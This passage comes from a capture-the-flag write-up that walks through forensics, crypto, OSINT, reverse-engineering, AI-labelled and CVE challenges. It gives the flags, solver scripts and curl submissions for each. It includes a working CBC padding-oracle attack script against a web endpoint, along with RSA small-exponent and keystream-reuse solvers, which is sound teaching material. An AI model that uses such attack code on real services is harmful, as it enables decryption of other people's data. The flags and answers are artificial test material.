- **The decoy.** `app/src/main/res/values/archive.xml` contains `<string name="archive_auth_token">safctf{94f40cc6…}</string>`. It's the "archived release note" from the hint: it has a fabricated 2026 mtime and is **absent from `app/build/`** because the build ran years earlier. The recovery screen it belongs to never existed in this build.
- **The flag.** `app/src/main/res/menu/main.xml` - the app's **main menu** - hides the flag as four `<item>` fragments with `android:title` values, deliberately shuffled, each carrying an `android:orderInCategory` number. And the strings resource says the quiet part out loud:

  > `<string name="your_are_here_for_the_safCTF">This can be a hotel you know, check the main menu and make sure to order</string>`

Order the four items by `orderInCategory` and concatenate their titles. That's the flag. No crypto, no SQLite - pure resource forensics.

**Flag:** `safctf{1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e}` *(from the ordered menu items - note this host has no `/submit` at all)*

---

## 4. Forensics

Four challenges, and they split neatly into the two `/submit` families described above. Matchday Replay and Second Pressing are traps in the same way: the artefact contains the real flag, and the page offers you a `/submit` button that returns a convincing fake. Long Exposure and Fancy Details run the other way in spirit, though only Long Exposure actually uses the exchange: there the artefact gives you a receipt and `/submit` is the machine that cashes it. Same button, opposite meaning, and getting it backwards costs you a submission either way.

---

### Matchday Replay - 200 pts · Forensics
`http://54.72.82.22:8450`

![Matchday Replay](/images/matchdayreplay.png)

**Vibe:** *"The match is over, but something was left behind in the replay system."* A `replay.zip` with a packet capture of a bespoke layer-2 protocol and a session log.

**Solve:** The capture's `LIVE` frames are out-of-order fragments of a 44-byte payload. The session log leaks the "replay card" id: `afterglow-17`. The payload is:

```bash
safctf{5554fd00-017a-4915-a883-a7ef2639f73b}
```

XOR-encrypted with a keystream that is **the first 12 bytes of `SHA-256("afterglow-17")`, repeated**. Note the **period-12** detail - not the full 32-byte digest, just the first 12 bytes cycling. That one detail is the whole challenge; assume the standard 32-byte keystream and you'll get garbage.

Submit that token to `/submit` and it returns the real flag. **Flag:** `safctf{e2d6cc7b320577dd3eb54aa08f86e446}`

---

### Second Pressing - 250 pts · Forensics
`http://54.72.82.22:8460`

![Second Pressing](/images/secondpressing.png)

**Vibe:** *"A favorite record deserves another listen... somewhere between the first play and the replay, something feels different."*

**Bug:** A **SQLite database shipped with its write-ahead log**. The main `library.db` is completely empty - every live row is sitting in the uncheckpointed `library.db-wal`.

**Solve:** Apply the WAL the normal way and you see the *second* pressing:

```bash
(1, 'Test pressing', 'withdrawn')
```

But the WAL still contains an **earlier frame on the same page** - the *first* pressing - whose `receipt` column was later overwritten with the literal string `withdrawn`. That original receipt is a base64-encoded zlib blob:

```bash
eJwrTkxLLkmrNjRKSko2NUzRNTcxNdA1MUk2001MM07TNTQ3MjY1NEmySExMqQUALKEM0A==
    │
    ├─ base64 -d ──▶ zlib (78 9c) ──▶ safctf{12bbc51d-7450-44c6-af3f-1723514b8aad}
```

That decoded value **is** the flag. Don't send it to `/submit` - that endpoint is a decoy which returns a different flag-shaped string the scoring platform rejects. Just submit the decoded value.

**Flag:** `safctf{12bbc51d-7450-44c6-af3f-1723514b8aad}`

**Takeaway:** A WAL is a log, and logs remember what the current state forgot. `sqlite3` applying the WAL gives you the present; the WAL file itself still holds the past.

---

### Long Exposure - 350 pts · Forensics
`http://54.72.82.22:8470`

*Credit: this one comes from [itatipaul](https://github.com/itatipaul) (senpai) - [portfolio](https://itatipaul.github.io/).*

**Vibe:** *"Some moments belong to the blue hour."* A fake photography site with one download, `field-kit.zip`, and a footer line that is doing way more work than it looks: *"Keep your collection receipt when your visit is complete."*

**Bug:** Two artefacts, two separate mistakes. A process core dump that stores an AES-256 key **raw, in plaintext, immediately after an 8-byte marker**, and a packet capture that smuggles a 72-byte AES-GCM blob out as base32 DNS labels whose padding has been stripped.

**Solve:** The zip holds `field-note.txt`, `modules.map` (`00001000-00009000 rw-p studio-worker`), `process.core` (32768 bytes, exactly `0x9000 - 0x1000`) and `uplink.pcap` (158 packets, link type 147, so Wireshark refuses to dissect it). `modules.map` exists for one reason: file offset = virtual address minus `0x1000`.

The core dump is statistically random end to end, no key schedules, no pointers, nothing in a bit-plane render. The only plaintext in it is a tag:

```text
VA 0x2b70 (file offset 0x1b70):  45 56 50 43 54 58 30 33   "EVPCTX03"
```

Everything after that looks like noise, which is exactly what a raw key looks like. In the capture, 150 packets carry a `NOI` magic and are pure decoys - no correlation, no bit bias, nothing decrypts under any key. The other 8 carry `QRY\x00` plus an index byte plus a DNS-style label:

```text
idx 0  PZRA3C5MF2WARTI.img.field.test
idx 1  6CYYWT3ECKT45IY.img.field.test
...
idx 7  UORLITSJBNLJVUI.img.field.test
```

They arrive out of order (3, 1, 7, 6, 2, 5, 4, 0), so the index byte restores the sequence. **The trap:** each label is 15 base32 characters, which is 75 bits and not a whole number of bytes. Concatenating all eight and decoding gives you 75 bit-misaligned bytes and every brute force downstream fails silently. The sender encoded each **9-byte chunk separately**; 9 bytes is 15 characters plus one `=` pad, and the pad was dropped because it can't appear in a DNS label. Re-pad each label to 16 characters and decode it on its own, and you get 8 x 9 = 72 bytes, which is exactly 12-byte nonce plus 44-byte ciphertext plus 16-byte GCM tag.

Now sliding every 16- and 32-byte window of the core dump over AES-256-GCM is safe, because GCM authenticates and a wrong key cannot produce a false positive. Exactly one window passes:

```text
VA 0x2b78 (file offset 0x1b78), 32 bytes
6816c31d3e7805d2ea58a8ecf6aba07ed2766c3cadd24e37a6797d9466ebc059
```

That is the 32 bytes immediately after `EVPCTX03`, the thought you were told to hold earlier. Decrypting gives:

```bash
safctf{c9ddd1e9-f650-4bae-a650-5c9a92edabe4}
```

**The twist:** the CTF platform rejects it, even though the GCM tag verified, so the decryption is definitely correct. It doesn't match the flag format used everywhere else (32 hex chars, not a UUID), and the page mentioned a "collection receipt" plus a POST-only `/submit`. It's a token to exchange:

```bash
curl -s -X POST http://54.72.82.22:8470/submit \
  -H 'Content-Type: application/json' \
  -d '{"answer":"safctf{c9ddd1e9-f650-4bae-a650-5c9a92edabe4}"}'
# {"message":"safctf{f4946c9564b982892e9d41315b3ec739}","ok":true}
```

The solve script, run from the extracted directory:

```python
import base64, struct
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# 1. Reassemble the DNS-style exfil (QRY packets), ordered by their index byte
raw = open("uplink.pcap", "rb").read()
off, chunks = 24, {}
while off < len(raw):
    _, _, incl, _ = struct.unpack("<IIII", raw[off:off + 16])
    pkt = raw[off + 16:off + 16 + incl]
    off += 16 + incl
    if pkt[:4] == b"QRY\x00":
        label = pkt[5:].decode().split(".")[0]
        # decode each label on its own: 15 chars -> 9 bytes ('=' was stripped for DNS)
        chunks[pkt[4]] = base64.b32decode(label + "=" * (-len(label) % 8))
blob = b"".join(chunks[i] for i in sorted(chunks))
assert len(blob) == 72

# 2. Key = the 32 bytes right after the EVPCTX03 marker in the memory dump
core = open("process.core", "rb").read()
m = core.index(b"EVPCTX03")
key = core[m + 8:m + 40]

# 3. AES-256-GCM: 12-byte nonce | ciphertext | 16-byte tag
print(AESGCM(key).decrypt(blob[:12], blob[12:], None).decode())
```

**Flag:** `safctf{f4946c9564b982892e9d41315b3ec739}`

**Takeaway:** Check chunk alignment before you conclude the key or cipher is wrong. If a piece's encoded length isn't a multiple of the encoding's block size, it was probably encoded per chunk with the padding stripped. And a short plaintext tag sitting in an otherwise random dump is almost always a signpost pointing at adjacent secret material, so read the bytes right after it first.

---

### Fancy Details - 300 pts · Forensics
`http://54.72.82.22:8210`

*Credit: this one comes from [itatipaul](https://github.com/itatipaul) (senpai) - [portfolio](https://itatipaul.github.io/).*

**Vibe:** *"A thoughtful touch can change the whole impression."* A site calling itself "FRAME / FOUND", two downloads, and a paragraph of photography-flavoured prose that contains the actual hint if you read it as an instruction rather than set dressing.

**Bug:** An EXIF `Artist` tag holding an ROT13-and-reversed `openssl enc` passphrase, in front of an encrypted archive whose cipher, digest and iteration count are all unlabelled.

**Solve:** The downloads are `/downloads/photo.jpg` and `/downloads/archive.tar.gz.enc`, the latter identified by `file` as `openssl enc'd data with salted password` (the standard `Salted__` header). Dump the metadata properly:

```bash
exiftool -a -u -g1 photo.jpg
```

```text
[IFD0]  Artist          : qebjffnc
[GPS]   GPSLatitude     : 52 deg 28' 48.00"
[GPS]   GPSLongitude    : 1 deg 53' 24.00"
```

No other interesting EXIF, no trailing data after the `FFD9` end-of-image marker, and `steghide`/`stegseek` with rockyou and a custom wordlist both found nothing, so the GPS coordinates and that whole path are red herrings. The decorative "data" numerals in the background art are also just AI-image-generation artifacts: inconsistent glyph shapes, no stable digit count, a classic diffusion-model text-rendering failure rather than a puzzle.

`Artist` is a deliberately apt field for a hint about "a thoughtful touch", since it literally records who touched the file. Decode it:

```python
import codecs
s = "qebjffnc"
codecs.encode(s, "rot13")[::-1]   # -> 'password'
```

ROT13 then reverse gives `password`. (Order doesn't matter, they commute.) Now the archive. A plain `openssl enc -d -aes-256-cbc -pbkdf2 ... -k password` fails with "bad decrypt", and here is the detail that matters: because OpenSSL's CBC mode validates PKCS#7 padding, a **wrong** cipher/digest/iteration combo can occasionally still pass the padding check by chance and hand you garbage that looks like a success. So validate on the decrypted content's magic bytes, not on the exit code:

```python
import subprocess
ciphers = ["aes-256-cbc","aes-192-cbc","aes-128-cbc","des-ede3-cbc","bf-cbc","cast5-cbc"]
mds     = ["md5","sha1","sha256","sha512"]
iters   = [1,1000,10000,100000,200000]

for c in ciphers:
    for it in iters:
        for md in mds:
            r = subprocess.run(
                ["openssl","enc","-d",f"-{c}","-pbkdf2","-iter",str(it),"-md",md,
                 "-in","archive_tar_gz.enc","-out","/tmp/o.bin","-k","password"],
                capture_output=True)
            if r.returncode == 0 and open("/tmp/o.bin","rb").read(2) == b"\x1f\x8b":
                print("HIT", c, md, it)
```

The hit is `aes-256-cbc`, PBKDF2, `-md sha256`, `-iter 100000`. Peel the layers:

```text
archive.tar.gz   (gzip)
  └── nested1.tar
        └── flag.txt
```

```bash
tar xzf archive.tar.gz        # -> nested1.tar
tar xf  nested1.tar           # -> flag.txt
cat flag.txt
```

**Flag:** `safctf{245ccf0110f6422d41671064cee8da68}`

**Takeaway:** `exiftool -a -u -g1` before anything fancier, every time. A field that looks like noise is worth a ROT13 and a reversal because both are free. And when you're cracking an `openssl enc` file, remember the `Salted__` header carries no indication of cipher, digest or iteration count, so check the decrypted bytes rather than trusting a clean exit.

---

## 5. Crypto

Three challenges, three bugs that were all published before I was born. That is not an insult to the challenge authors, it is the point: RSA with a small public exponent, a keystream reused across two messages, and a padding oracle are each decades old, each still ships, and each still falls over in an afternoon.

---

### Three Encores - 300 pts · Crypto
`http://54.72.82.22:8420`

*Credit: this one comes from [itatipaul](https://github.com/itatipaul) (senpai) - [portfolio](https://itatipaul.github.io/).*

**Vibe:** A "programme" service. You get three ciphertexts, three moduli, and a small public exponent. It is practically a signpost.

**Bug:** **Håstad's broadcast attack.** The same plaintext encrypted under three different moduli, all with `e = 3`. With `m^3 < n1*n2*n3`, the CRT step is unnecessary: since the same `m` was used and each `c` is already `m^3 mod n`, the three ciphertexts collapse to a plain integer cube root.

**Solve:** Confirm `e = 3` and three distinct moduli, take the integer cube root of the (identical) ciphertext, and you land on:

```text
programme:safctf{dadb56ae-eede-422e-87cb-744462cdfda0}
```

Submitting that full string gets a 403. Submitting just the inner `safctf{...}` gets a 200:

```json
{"message":"safctf{0471ad15e84bb9f630e394e49dde85a9}","ok":true}
```

The solver is a binary search for the integer cube root with an assertion so it can't quietly lie to you:

```python
def icbrt(n):
    lo, hi = 0, 1 << ((n.bit_length() + 2) // 3 + 1)
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if mid ** 3 <= n:
            lo = mid
        else:
            hi = mid - 1
    assert lo ** 3 == n
    return lo
```

**Flag:** `safctf{0471ad15e84bb9f630e394e49dde85a9}`

**Takeaway:** `e = 3` with a short plaintext and no padding is not encryption, it is a very slow way to write a cube. If you ever catch yourself computing a CRT, check whether the ciphertext is already smaller than the modulus product first.

---

### Parallel Lines - 350 pts · Crypto
`http://54.72.82.22:8430`

*Credit: this one comes from [itatipaul](https://github.com/itatipaul) (senpai) - [portfolio](https://itatipaul.github.io/).*

**Vibe:** A "lookbook" service. Two encrypted exports, one memo, and a JSON file containing a permutation and a nonce. The nonce is a red herring, which is a sentence I got to write after spending time on it.

**Bug:** **Two-time pad.** The same keystream is used for both exports, so `A XOR B = M XOR P`. With one known plaintext (`memo.txt`), the keystream falls straight out.

**Solve:** The archive lives at `/downloads/lookbook.zip` (`/lookbook.zip` 404s). Inside: `memo.txt` (153 bytes, the known plaintext), `export-a.bin` (153 bytes), `export-b.bin` (64 bytes) and `spool.json` containing the nonce plus a `spool_order` permutation of `0..152`. The shuffle is the obfuscation, and it has to be undone with the **inverse** permutation:

```python
import json
m  = open("memo.txt","rb").read()
a  = open("export-a.bin","rb").read()
b  = open("export-b.bin","rb").read()
sp = json.load(open("spool.json"))["spool_order"]
inv = [0]*len(sp)
for i, p in enumerate(sp):
    inv[p] = i
a2 = bytes(a[inv[i]] for i in range(len(a)))
ks = bytes(x ^ y for x, y in zip(a2, m))
print(bytes(x ^ y for x, y in zip(b, ks)))
```

Output:

```text
Collection receipt: safctf{0983d7d0-b930-468f-ac25-ecc6feecc856}
```

POST that to `/submit` and it hands back the real flag:

```json
{"message":"safctf{8d6447b3f694f59efef1f015f58d04a7}","ok":true}
```

Only the inverse applied to `export-a` produces text. Applying the permutation the obvious way, or trying to use `nonce` for anything, produces noise and wasted time.

**Flag:** `safctf{8d6447b3f694f59efef1f015f58d04a7}`

**Takeaway:** Keystream reuse is the single most expensive mistake in stream ciphers, and it is invisible until you have one known plaintext. If you can guess any part of either message, both messages are gone.

---

### Midnight Parcel - 450 pts · Crypto
`http://54.72.82.22:8440`

*Credit: this one comes from [itatipaul](https://github.com/itatipaul) (senpai) - [portfolio](https://itatipaul.github.io/).*

**Vibe:** *"The streets are quiet, the lights are fading, and one delivery is still waiting to be collected."* A "Desk console" page that documents its own API: `GET /api/parcel` returns the current parcel ciphertext, `POST /api/receipt` records a delivery status.

**Bug:** **Vaudenay CBC padding oracle.** `POST /api/receipt` tells you whether your ciphertext decrypts to valid PKCS#7 padding, and that single bit of feedback is enough to decrypt everything without the key.

**Solve:** `GET /api/parcel` returns 192 hex characters, 96 bytes, which splits cleanly into six 16-byte AES blocks: one IV plus five ciphertext blocks. Confirm the oracle three ways:

```bash
# unmodified parcel -> valid padding
curl -s -X POST .../api/receipt -d '{"parcel":"<original hex>"}'
# {"status":"pending"}

# flip the last byte -> padding almost certainly breaks
curl -s -X POST .../api/receipt -d '{"parcel":"<original hex, last byte flipped>"}'
# {"status":"damaged"}

# garbage input
curl -s -X POST .../api/receipt -d '{"parcel":"deadbeef"}'
# {"status":"damaged"}
```

`"pending"` appears only when PKCS#7 validates. With `P_i = D(C_i) XOR C_{i-1}` (and `C_0 = IV`), you recover the intermediate value `D(C_i)` one byte at a time by submitting a modified `C_{i-1}` and brute-forcing each byte until the padding validates. The `pad_val == 1` case has a known ambiguity, since the original unmodified padding may also read as valid, so disambiguate by flipping an earlier byte and re-checking.

```python
def oracle(prev16: bytes, target16: bytes) -> bool:
    hexval = (prev16 + target16).hex()
    r = session.post(f"{BASE}/api/receipt", json={"parcel": hexval}, timeout=30)
    return r.json().get("status") == "pending"

def decrypt_block(prev, target):
    intermediate = bytearray(16)
    for pad_val in range(1, 17):
        pos = 16 - pad_val
        base = bytearray(16)
        for k in range(pos + 1, 16):
            base[k] = intermediate[k] ^ pad_val
        candidates = [g for g in range(256)
                      if oracle(bytes(base[:pos]) + bytes([g]) + bytes(base[pos+1:]), target)]
        guess = candidates[0]
        if len(candidates) > 1:            # disambiguate pad_val==1 false positives
            for g in candidates:
                trial = bytearray(base); trial[pos] = g
                if pos > 0:
                    trial[pos - 1] ^= 0xFF
                    if oracle(bytes(trial), target):
                        guess = g; break
        intermediate[pos] = guess ^ pad_val
    return bytes(a ^ b for a, b in zip(intermediate, prev))
```

Roughly 10,000 oracle queries later (about 5 blocks x 16 bytes x ~128 average guesses), stripping the final PKCS#7 padding gives:

```text
Receipt for the evening delivery: safctf{8a99e6bb-7903-4f4e-b42a-7e594982528b}
```

Another receipt, another exchange. Note that POSTing the UUID back to `/api/receipt` as the `parcel` field just returns `422 {"status":"damaged"}`, because that endpoint only accepts hex ciphertext:

```bash
curl -i -X POST http://54.72.82.22:8440/submit \
  -H 'Content-Type: application/json' \
  -d '{"answer":"safctf{8a99e6bb-7903-4f4e-b42a-7e594982528b}"}'
# {"message":"safctf{f895fa37be9a374582ff7694a4748862}","ok":true}
```

One operational note: the service did not enjoy being hit with large bursts, and raw speed caused server-side stalls. Modest concurrency with retry and backoff beat a big thread pool.

**Flag:** `safctf{f895fa37be9a374582ff7694a4748862}`

**Takeaway:** Never let a decrypt-and-validate-padding path leak its result to attacker-controlled input. This is the POODLE-class bug, and encrypt-then-MAC (or an AEAD mode) with a constant-time uniform error response removes the oracle entirely. It needs no key and no cryptanalysis, just a reliable binary signal repeated ten thousand times.

---

## 6. OSINT

Three challenges, and they're all the same shape underneath: a prose clue, a pile of structured records, and a receipt you have to compute. The points scale with how many keys you have to join on.

---

### Paper Lanterns - 200 pts · OSINT
`http://54.72.82.22:8480`

![Paper Lanterns](/images/paperlanterns.png)

**Vibe:** *"Each one carrying a small message into the darkness. From a distance, they all look the same."* A `field-notes.zip` with a postcard, a district legend, and a 36-row directory.

**Solve:** The postcard is the clue:

```
Lunch beneath a glass roof, somewhere east of the river. The brass plaque said 1997.
```

Three constraints, three fields:

| Prose | Constraint | Field |
|---|---|---|
| "beneath a **glass roof**" | glass roof | `roof = "glass"` |
| "**east** of the river" | east bank | `district = "East"` |
| "the brass **plaque said 1997**" | founding year | `opened = 1997` |

Filter the 36-row `civic-directory.json` on all three, and exactly one row survives: ref `ba57ce94e3`. (The filename is a hint about the shape of the data - the generator cycles `district` with period 4, `roof` with period 3, so `East ∧ glass` alone leaves 3 candidates. You need the year too.) POST it:

```bash
curl -s -H 'Content-Type: application/json' -d '{"answer":"ba57ce94e3"}' http://54.72.82.22:8480/submit
```

```json
{"message":"safctf{38309964a77c499b1ec234c401f68fe1}","ok":true}
```

**Flag:** `safctf{38309964a77c499b1ec234c401f68fe1}`

---

### Last Tram Home - 300 pts · OSINT
`http://54.72.82.22:8490`

![Last Tram Home](/images/lasttranhome.png)

**Vibe:** *"The last tram begins its journey through the sleeping city... one stop remains on the route."* The task says **"Reconcile the studio visit"**. That word - *reconcile* - is the whole challenge.

**Solve:** Five files. `submission.txt` gives the receipt contract:

```bash
Collection receipt format: SHA256(venue_ref|event_ref|UTC_date), lowercase hex.
```

Note the third input is **`UTC_date`**. The word *UTC* is doing enormous work here. Then `studio-post.txt`:

```bash
The last frame was taken at stop 18, three hours after UTC. The wall clock read 21:30 on 18 April 2026.
```

"Three hours after UTC" means local is **UTC+3**, so `UTC = local - 3h`. 21:30 local on 18 April → **18:30 UTC on 18 April**. (If it had rolled over midnight, the *date* would change - which is exactly why the formula says `UTC_date`. That's the trap.)

Four links:

```bash
stop 18  ──tram.csv──▶  venue b59c881fc2
                            │
programme.json  ──venue b59c881fc2 + time_utc 2026-04-18T18:30:00Z──▶  event 2011bf1eeb4b
                            │
preimage = "b59c881fc2|2011bf1eeb4b|2026-04-18"
receipt  = SHA256(preimage) = 57aa623e8a9afd3082a959b18371e03ea717d6ad03f7e68948162fc507ee914d
```

Then there's the **decoy**: `civic-directory.json` is the *same schema as Paper Lanterns*, and the row reachable from stop 18 is `House 18` - byte-for-byte the answer row from the previous challenge. If you solved Paper Lanterns and pattern-match on "find the house", you get a warm glow of recognition and a wrong receipt. That file contributes nothing.

**Flag:** `safctf{a7290ed4a3ba7af7bd4b4c529eb99314}`

---

### Blue Meridian - 550 pts · OSINT
`http://54.72.82.22:8500`

![Blue Meridian](/images/bluemeridian.png)

**Vibe:** *"A single line cuts quietly across the familiar landscape, pointing toward somewhere that isn't marked on any ordinary chart."* The 550-point ceiling. Task: *"Identify the documented departure."*

**Solve:** Six files. The contract has changed shape from Last Tram Home:

```bash
Receipt format: SHA256(voyage_ref|station_ref|UTC_time), lowercase hex. UTC_time uses HH:MMZ.
```

Two gotchas baked in: the third input is an **`HH:MMZ` time**, not a date (if you reuse Last Tram Home's date-based formula you get a silently wrong answer), and the second input is the **station *ref*, not its tide reading**.

`pier-note.txt` is the inverse of the previous challenge's timezone hint:

```bash
At the exposure, the gauge was 219 cm. Clock and compass had both been serviced that morning.
```

The first time through this, I read that as scene-setting. It's a **trust assertion**: "serviced that morning" means the instruments were calibrated, so the clock is true (no drift) and the compass is true (no deviation). Where Last Tram Home told you to *correct* the time, this one tells you *not to*.

The join:

- `camera-metadata.json` gives `local_time 2026-06-04T21:00:00`, `utc_offset +02:00` → **19:00Z**, plus `compass_degrees: 11` → voyage `bearing`, and `vessel_mark: "vessel-3"` → voyage `vessel`.
- `tide-station.csv` maps `tide_cm 219` → station ref. Watch out: 60 rows but only **36 distinct stations**, so tide alone isn't unique.
- `voyages.json` has 60 entries. Joining on `vessel` first returns **two** candidates - you need the bearing, the station and the time as well to collapse to one: `voyage_ref d0b36031a079e290`.

```bash
receipt = SHA256("d0b36031a079e290|<station_ref>|19:00Z")
        = a037d4fd49143de5d5abbe38b536198ba777879089dd3b44dec83ac1b962c845
```

**Flag:** `safctf{756f7d81426571a6d6dac9b1aae5f271}`

**Takeaway:** The whole OSINT series is one lesson repeated at increasing difficulty: **entity resolution under uncertainty.** One record out of many is the answer, the decoys are plausible, and a wrong join produces a receipt that looks perfectly valid and is silently useless.

---

## 7. Reverse Engineering

Three binaries, all named `receipt`, all stripped, all about 14.5 KB, and all "feed me a 24-character string" license checkers. It's a nice little ladder: one per-index XOR-and-add key check, one TEA block cipher, and one tiny bytecode VM. All three are straightforward once you stop being intimidated by the word *stripped*.

---

### Pixel Courier - 150 pts · RE

*Credit: this one comes from [itatipaul](https://github.com/itatipaul) (senpai) - [portfolio](https://itatipaul.github.io/).*

**Vibe:** *"Your next delivery is already on its way. A circulated checksum belongs to an older release, according to one archive."* A stripped x86-64 ELF that prints `Parcel desk` and then waits for a 24-character password.

**Bug:** Not a bug so much as a design decision: the check is a per-index transform that is trivially invertible, and the binary is **not PIE**, so every address in the disassembly is stable and you can read `main` directly.

**Solve:** Identification first:

```bash
$ file receipt
receipt: ELF 64-bit LSB executable, x86-64, dynamically linked,
BuildID[sha1]=dd38bd9e160c4f4b3cb70133b85523405effcbdc, stripped
$ checksec --file=receipt
Partial RELRO   No canary found   NX enabled    No PIE
```

Stripped means no symbol names, but the ELF entry point runs the standard `__libc_start_main` stub and passes `main` in `%rdi`:

```text
401094:  mov  $0x4011e4, %rdi     ; main = 0x4011e4
40109b:  call *0x2f37(%rip)       ; __libc_start_main
```

Two hardcoded byte arrays are built on the stack: `A[]` at `rbp-0xb0` and `B[]` at `rbp-0xd0`, both 24 bytes. The length check (`cmp $0x18, %rax` at `0x4012be`) confirms 24. Then the loop at `0x4012cb` walks `i` from 0 to 23 and computes `input[A[i]]` transformed, adding `i`, comparing the low byte against `B[i]`.

Here is the trap, and it is a genuinely good one. The arithmetic looks like four separate ops:

```text
eax = i
add  %eax, %eax       ; 2i
add  %ecx, %eax       ; 3i
shl  $0x2, %eax       ; 12i
add  %ecx, %eax       ; 13i
add  $0x5b, %eax      ; 13i + 91
```

Read `shl $0x2` as "times four" without noticing that the accumulator is already `3i` and you write down `9i + 91`, and then nothing works and you blame the arrays. The real constraint is:

```text
(input[A[i]] ^ ((13*i + 91) & 0xff)) + i  ==  B[i]      (mod 256)
```

Which inverts cleanly, byte by byte, with no brute force:

```python
A = [
    0x00, 0x0a, 0x04, 0x05, 0x07, 0x02, 0x0b, 0x03,
    0x11, 0x14, 0x12, 0x13, 0x0d, 0x10, 0x09, 0x0e,
    0x0c, 0x08, 0x15, 0x17, 0x16, 0x01, 0x0f, 0x06,
]
B = [
    0x1f, 0x25, 0x25, 0xba, 0xc5, 0xcd, 0x03, 0x95,
    0x9b, 0x8a, 0xa4, 0xb3, 0xb2, 0x54, 0x67, 0x6a,
    0x8e, 0x1b, 0x1a, 0x2b, 0x29, 0x50, 0x65, 0xcb,
]

buf = [0] * 24
for i in range(24):
    buf[A[i]] = ((B[i] - i) & 0xff) ^ ((13 * i + 91) & 0xff)

print(bytes(buf).decode())
# DWT8V52N2HLTUQE6CPGBQMJJ
```

```bash
$ echo "DWT8V52N2HLTUQE6CPGBQMJJ" | ./receipt
Parcel desk
safctf{e7802274-4b04-488a-9319-39ca86e83c9f}
```

The "archive" line in the description is misdirection: it nudges you toward an older build matching some published checksum, but the served binary is the one that matters and its own hashes (`sha256 846fd968...`, `md5 07de8061...`) never needed to match anything.

**Flag:** `safctf{e7802274-4b04-488a-9319-39ca86e83c9f}`

**Takeaway:** Stripped does not mean opaque, because `__libc_start_main` always gets `main` as its first argument. And trust the assembly over the source you imagine: `add eax,eax` + `add ecx,eax` + `shl $0x2` + `add ecx,eax` is `13*i`, not `9*i`, and one misread here costs an hour.

---

### Clockwork Ballet - 150 pts · RE
`http://54.72.82.22:8520`

![Clockwork Ballet](/images/clockworkballet.png)

*Also written up by [itatipaul](https://github.com/itatipaul) (senpai) - [portfolio](https://itatipaul.github.io/). His notes are where the TEA key array below comes from.*

**Vibe:** A license/serial checker. Stripped ELF, 14,536 bytes.

**Solve:** Three steps in `main`:

1. Read a line, require the trimmed length to be **exactly 24 characters**.
2. Copy those 24 bytes onto the stack and **TEA-encrypt** them in place (three 8-byte blocks, 32 rounds, delta `0x9e3779b9`).
3. `memcmp` the ciphertext against six hard-coded dwords baked into `main`. On a match, call a printer that emits 44 bytes of `input[i % 24] ^ table[i]`.

So the required serial is the **TEA *decryption*** of the hard-coded target block - the operation is invertible, so you run it backwards:

```bash
serial : HA323U86XL793TXB52BTK6WP
flag   : safctf{93d4bf6a-b750-4379-9038-c4921872c148}
```

Verified locally: the recovered serial exits `0` and prints the flag; anything else exits `1`.

For reference, the values that make the reversal work. The binary is BuildID `sha1 0b2506d60a5a2916b0e5327880b90472c7adb7e5`, `main` sits at `0x4012bd` (entry `0x4010a0`), the TEA key is `0xe23d414a, 0xfa100e27, 0x6ac599cc, 0x0c1d1a24`, and the 24-byte target block the ciphertext is compared against is:

```text
af 01 49 42 ec c4 11 a8 99 66 96 be 04 ef b6 41 3c f1 8b c3 1e 1c 3a ba
```

That left 3 solves on the board. Senpai's notes go back and forth on the "Misplaced Piece" hint, which reads like a nudge about the ordering of the three 8-byte TEA blocks rather than a separate puzzle, so decrypt all three blocks and check the order before assuming the obvious one.

**Flag:** `safctf{93d4bf6a-b750-4379-9038-c4921872c148}`

---

### Prism Orchestra - 450 pts · RE
`http://54.72.82.22:8530`

*Also written up by [itatipaul](https://github.com/itatipaul) (senpai) - [portfolio](https://itatipaul.github.io/).*

**Vibe:** Two artefacts: the same-sized `receipt` binary, and `score.bin` - 540 bytes of pure bytecode. The name is honest: it's a tiny virtual machine conducting a little orchestra.

**Solve:** `receipt` is a **bytecode interpreter**:

1. Builds a 24-byte **TARGET** on the stack (three `movabs` immediates).
2. Reads a 24-character line from stdin.
3. `fopen`s a hard-coded path - `/app/downloads/score.bin` - and interprets it as a stream of **3-byte records `[op][a][b]`**, mutating the buffer in place.
4. `memcmp`s the mutated buffer against TARGET.
5. On a match, a printer turns the *original* input into 44 bytes using a 44-byte XOR table.

The instruction set is four ops, and **all four are invertible**:

```bash
op 1 : buf[a] ^= b                            (self-inverse)
op 2 : buf[a]  = (buf[a] + b) & 0xFF          (invert: subtract)
op 3 : buf[a]  = ROL8(buf[a], (b % 7) + 1)    (invert: rotate right)
op 4 : swap(buf[a], buf[b % 24])              (self-inverse)
```

Which means you never have to *search* for the input - you run `score.bin` **backwards** from TARGET and the required input falls out:

```bash
input : DDPU5WDMVRKQ2APHL7WPM78W
flag  : safctf{406279bd-3201-499f-9a4a-f14e8918eb37}
```

**Flag:** `safctf{406279bd-3201-499f-9a4a-f14e8918eb37}`

**Takeaway:** "Stripped" means no symbol names. It does not mean "no structure". All three RE challenges were written by someone who wanted you to *understand* the algorithm, not brute-force it, and all three reward running the machine in reverse.

---

## 8. AI

### Fragments - 150 pts · AI
`http://54.72.82.22:8190`

![Fragments challenge card](/images/frankments.png)

**Vibe:** Filed under **AI**. Presents as a virtual-idol chatbot called **Echo Companion** - *"A familiar voice, a new melody, and a little room to daydream."* The clue:

> The mind wanders, especially after a long day.
> A redacted transcript refers to a **missing conversation**; its provenance is uncertain.

**Solve:** `POST /ask` with `{"prompt": "..."}`. Every prompt gets the same canned refusal:

```json
{"response": "AI: Sorry, I don't recall anything unusual."}
```

There's no model here. The "AI" is an `if` statement. It returns the flag to any prompt containing the substring **`memory`** or **`recall`** - case-insensitive - and refuses everything else. Two words. That's the challenge.

**Flag:** `safctf{d432e09718e6cb46387f54e27dbc0168}`

**Takeaway - and this is the actual twist of the challenge:** the AI tag is the misdirection. Nothing here needed prompt engineering, jailbreaking, or any knowledge of LLMs. It's a string-matching bug wearing a persona. Which is honestly a decent little commentary on how much "AI security" is still just `if "password" in input`.

---

## 9. CVE

### Fan Signal Lab - 350 pts · CVE
`http://54.72.82.22:8220`

![Fan Signal Lab](/images/fansignallab.png)

**Vibe:** A Spring Boot app that serves its page as `text/plain` (deliberately killing browser-side XSS and pointing you server-side). The flavour text is one of the best hint sets in the whole CTF:

| Clue | Meaning |
|---|---|
| "You can **Text** Me But, Can You **Speak My Language**?" | **Text4Shell** - the `${script:...}` interpolator runs code in a scripting language |
| "an old incident note names a **neighboring version**" | The advisory names **1.10.0** as the fix |
| "verify which build is actually **running**" | Fingerprint the actual Commons Text version |
| "the smallest **note** sets the mood" | The smallest unit of text - a single `${...}` token |

